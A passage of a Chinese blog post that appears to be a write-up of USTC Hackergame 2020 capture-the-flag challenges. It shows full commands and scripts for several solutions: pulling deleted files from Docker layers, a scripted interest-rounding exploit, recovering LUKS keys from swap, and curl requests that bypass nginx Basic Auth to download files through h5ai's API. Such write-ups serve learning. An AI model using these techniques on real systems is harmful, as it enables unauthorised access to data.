href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 